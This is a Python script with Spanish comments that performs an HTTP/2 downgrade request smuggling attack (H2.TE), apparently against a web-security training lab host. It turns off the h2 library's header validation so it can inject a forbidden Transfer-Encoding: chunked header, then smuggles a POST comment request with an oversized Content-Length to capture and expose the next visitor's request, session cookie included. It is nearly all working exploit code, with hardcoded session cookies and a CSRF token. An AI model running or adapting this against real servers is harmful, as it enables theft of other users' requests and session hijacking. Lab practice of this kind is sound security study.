#!/usr/bin/env python3
"""
HTTP Request Smuggling  ->  H2.TE  (HTTP/2 request smuggling / downgrade)
========================================================================
El front-end habla HTTP/2 y lo DEGRADA a HTTP/1.1 para el back-end. Si al
degradar arrastra el header  Transfer-Encoding: chunked  que metimos en la
peticion HTTP/2, el back-end procesa "chunked", ve el chunk "0" como fin y
lo que sigue queda COLADO como inicio de la siguiente peticion.

Por que NO sirve un socket crudo (como en cl_te.py / te_cl.py):
  - HTTP/2 usa frames binarios + compresion de cabeceras HPACK, no texto plano.
  - Ademas  transfer-encoding  es un header PROHIBIDO en HTTP/2: cualquier
    cliente normal lo rechaza. Por eso usamos la libreria  h2  con la
    VALIDACION DESACTIVADA, para poder inyectarlo igual.

Requisito:
    pip install h2

Uso:
    python h2_te.py
Cambia HOST / PORT y la peticion colada (SMUGGLED_REQUEST) abajo.
"""
import socket
import ssl
import time

try:
    import h2.connection
    import h2.config
    import h2.events
except ImportError:
    raise SystemExit(
        "[!] Falta la libreria 'h2'. Instalala con:  pip install h2"
    )

HOST = "0a9200db0407308b81dbca8800070002.web-security-academy.net"  # <-- tu lab
PORT = 443
TIMEOUT = 10            # segundos
SESSION = "9rG2ZEpqEMw19lQ7PE3mvxPncF7gXOTU"   # cookie de sesion (peticion externa)

# ---------------------------------------------------------------------------
# Peticion COLADA (HTTP/1.1). El Content-Length grande (500) hace que el
# back-end "capture" la peticion de la SIGUIENTE victima y la anexe a este
# comentario -> clasico robo de peticiones de otros usuarios.
# ---------------------------------------------------------------------------
SMUGGLED_REQUEST = (
    "POST /post/comment HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Cookie: session=0zwUPynDMAP5SrA8W2HsHOcfWu0sNgxI\r\n"
    "Content-Length: 500\r\n"
    "\r\n"
    "csrf=ahZq7NX1E0bnAKqM31ddLL8AxTFjqG5k&postId=10&name=gfds"
    "&email=fakkrina@gmail.com&website=&comment=gfds"
)

# Cuerpo de la peticion HTTP/2: chunk de cierre (0) + la peticion colada.
# Tras la degradacion a HTTP/1.1 el back-end (TE) corta en "0\r\n\r\n".
BODY = (
    "0\r\n"
    "\r\n"
    f"{SMUGGLED_REQUEST}"
)


def send_h2_te(host: str, port: int, body: str, timeout: float) -> bytes:
    """Abre TLS con ALPN h2, manda UNA peticion HTTP/2 con el header prohibido
    Transfer-Encoding: chunked, y devuelve la respuesta cruda."""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])          # negociamos HTTP/2 en el handshake
    # En labs con certificados raros:
    # ctx.check_hostname = False
    # ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, port), timeout=timeout)
    tls = ctx.wrap_socket(sock, server_hostname=host)
    if tls.selected_alpn_protocol() != "h2":
        tls.close()
        raise SystemExit("[!] El server no negocio HTTP/2 (ALPN != h2).")

    # Validacion/normalizacion OFF: asi 'h2' nos deja mandar transfer-encoding.
    config = h2.config.H2Configuration(
        client_side=True,
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
        validate_inbound_headers=False,
    )
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send())

    # Pseudo-cabeceras primero (:method, :path, :authority, :scheme), luego el
    # resto. Aqui va el header prohibido que dispara el H2.TE.
    headers = [
        (":method", "POST"),
        (":path", "/"),
        (":authority", host),
        (":scheme", "https"),
        ("cookie", f"session={SESSION}"),
        ("content-type", "application/x-www-form-urlencoded"),
        ("transfer-encoding", "chunked"),   # <-- prohibido en H2; el vector H2.TE
    ]

    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers, end_stream=False)
    conn.send_data(stream_id, body.encode("latin-1"), end_stream=True)
    tls.sendall(conn.data_to_send())

    # Leer respuesta
    resp = b""
    status = None
    try:
        while True:
            try:
                data = tls.recv(65535)
            except socket.timeout:
                break                # normal en smuggling: se queda esperando
            if not data:
                break
            for event in conn.receive_data(data):
                if isinstance(event, h2.events.ResponseReceived):
                    for name, value in event.headers:
                        if name == ":status":
                            status = value
                elif isinstance(event, h2.events.DataReceived):
                    resp += event.data
                    conn.acknowledge_received_data(
                        event.flow_controlled_length, event.stream_id)
                elif isinstance(event, (h2.events.StreamEnded,
                                        h2.events.ConnectionTerminated)):
                    if status:
                        resp = f":status {status}\r\n\r\n".encode() + resp
                    tls.close()
                    return resp
            out = conn.data_to_send()
            if out:
                tls.sendall(out)
    finally:
        tls.close()

    if status:
        resp = f":status {status}\r\n\r\n".encode() + resp
    return resp


if __name__ == "__main__":
    print(f"[*] H2.TE  ->  {HOST}:{PORT}")
    print("[*] Peticion HTTP/2 con Transfer-Encoding: chunked (header prohibido).")
    print("[*] Cuerpo enviado:\n" + "-" * 40)
    print(BODY)
    print("-" * 40)
    print("[*] Nota: para robar la peticion de otro usuario suele hacer falta")
    print("    enviar esto DOS veces (1a envenena, 2a recupera). Reenvia si sale vacio.\n")

    t0 = time.perf_counter()
    resp = send_h2_te(HOST, PORT, BODY, TIMEOUT)
    dt = time.perf_counter() - t0

    print(f"[*] Respuesta ({len(resp)} bytes, {dt:.2f}s):\n" + "=" * 40)
    print(resp.decode("latin-1", errors="replace"))
